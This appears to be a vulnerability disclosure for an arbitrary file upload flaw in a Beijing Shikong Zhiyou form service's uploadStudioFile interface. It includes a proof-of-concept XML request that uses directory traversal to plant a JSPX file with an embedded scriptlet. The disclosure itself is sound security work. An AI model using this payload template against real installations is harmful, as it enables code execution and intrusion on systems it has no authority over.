## Beijing Shikong Zhiyou's uploadStudioFile interface has an arbitrary file upload vulnerability.
System fingerprint status The system fingerprint status is as follows: 

There are more than a thousand users using it across the entire network.
<img width="2550" height="1362" alt="image" src="https://github.com/user-attachments/assets/1a69c097-62ce-44ca-83e6-34e45618df69" />
### Vulnerability Analysis
com.artery.form.services.FormStudioUpdater#uploadStudioFile has an arbitrary file upload vulnerability.

The characteristics here are also obvious: it uses "content" to receive uploaded data. Note that the uploaded data must be in XML format, as the code clearly indicates that SAXReader() is used to parse the data.  

Here, filename, filepath, and filesize are all controllable, and these parameters are used as the basis for file upload in the subsequent code. Obviously, the file suffix is controllable, and directory traversal is possible.
<img width="1385" height="1159" alt="image" src="https://github.com/user-attachments/assets/b8898744-1359-4dc6-a046-e0cf605a839d" />

Note here: the file size must be consistent.
<img width="1361" height="539" alt="image" src="https://github.com/user-attachments/assets/57690810-1aed-4d96-a169-bb0ee917a287" />

Therefore, a data packet can be constructed: (Note here that if the data is transmitted in XML format, using the JSPX method is optimal, because JSPX is essentially also a type of XML.)

```
<hello xmlns:jsp="http://java.sun.com/JSP/Page">
  <filename>hello.jspx</filename>
  <filepath>../../../pad/</filepath>
  <filesize>§347§</filesize>
  <lmtime>2025-05-20 10:30:00</lmtime>
  <jsp:scriptlet>out.print("HelloWorldTest");new java.io.File(application.getRealPath(request.getServletPath())).delete();</jsp:scriptlet>
</hello>
```
The payload is as follows
 <img width="932" height="340" alt="image" src="https://github.com/user-attachments/assets/b467820d-9e61-453d-8eb5-a28ec2f8b345" />

Upload successful
<img width="2466" height="822" alt="image" src="https://github.com/user-attachments/assets/4620a00d-fb1a-4627-91dd-bf9d36672602" />


